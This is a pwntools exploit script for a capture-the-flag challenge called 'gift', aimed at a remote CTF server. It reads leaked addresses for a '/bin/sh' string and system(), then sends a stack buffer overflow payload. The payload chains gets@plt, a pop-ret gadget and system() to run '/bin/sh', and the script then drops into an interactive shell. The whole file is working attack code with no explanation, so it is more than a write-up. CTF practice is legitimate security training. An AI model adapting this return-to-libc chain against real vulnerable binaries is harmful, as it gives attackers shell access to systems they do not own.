#!/usr/bin/python3
from pwn import *
import time

#p = process("./gift")
p = remote("ctf.j0n9hyun.xyz",3018)

#gdb.attach(p)

print(p.recvuntil('here you are: ').decode())
binsh = int(p.recv(9), 16)
system = int(p.recv(11)[1:], 16)
gets_plt = 0x80483d0
popret = 0x804866b
dummy = 0x0

print('[*] binsh:', hex(binsh))
print('[*] system:', hex(system))

p.sendline(b'a')    # we don't care fgets()

payload = b'a'*0x84 + b'b'*4
payload += p32(gets_plt)    # input "/bin/sh" then system("/bin/sh")
payload += p32(popret)
payload += p32(binsh)
payload += p32(system) 
payload += p32(dummy)
payload += p32(binsh)

p.sendline(payload)
time.sleep(0.2)
p.interactive()
